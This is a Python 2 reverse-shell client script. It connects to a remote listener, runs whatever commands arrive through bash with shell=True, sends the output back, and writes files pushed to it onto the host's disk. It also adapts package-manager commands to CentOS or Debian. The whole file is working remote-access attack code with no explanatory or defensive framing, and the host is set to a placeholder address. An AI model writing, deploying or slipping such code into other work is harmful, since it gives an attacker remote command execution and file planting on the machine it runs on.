#1/usr/bin/python
from socket import socket, AF_INET, SOCK_STREAM,error
from subprocess import Popen, PIPE
from platform import system,dist
from os import getcwd

buffer_size = 4096
host = '127.0.0.1'
port = 1234
max_timeout = 10
cwd = getcwd()
sock = socket(AF_INET , SOCK_STREAM)
sock.settimeout(max_timeout)

try:
    sock.connect((host, port))
except error as msg:
    print "Socket Error: %s" % msg

while True:
    try:
        data = sock.recv(buffer_size)
        if data == "F":
            des=sock.recv(4096)
            f=open(des,'wb')
            while True:
                try:
                    data = sock.recv(1024)
                    if data=="E":
                        f.close()
                        break
                    f.write(data)
                except:
                    f.close()
                    break
        else:
            if "package" in data:
                if dist()[0] == "centos":
                    data = data.replace("package", "yum")
                elif dist()[0] == "debian":
                    data = data.replace("package", "apt-get")
                elif system() == "Darwin":
                    data = ""
                    sock.send("not suppported on mac osx! \n")
            if "cd" in data:
                cwd = data.replace("cd ", "")
            proc = Popen(data, shell=True, stdin=None, stdout=PIPE, stderr=PIPE, executable="/bin/bash", cwd=cwd)
            out, err = proc.communicate()
            if err:
                sock.send(err)
            elif out and not err:
                sock.send(out)
            elif out == "" and not err:
                sock.send("Nothing to show ! \n")
    except Exception as e:
        continue
sock.close()
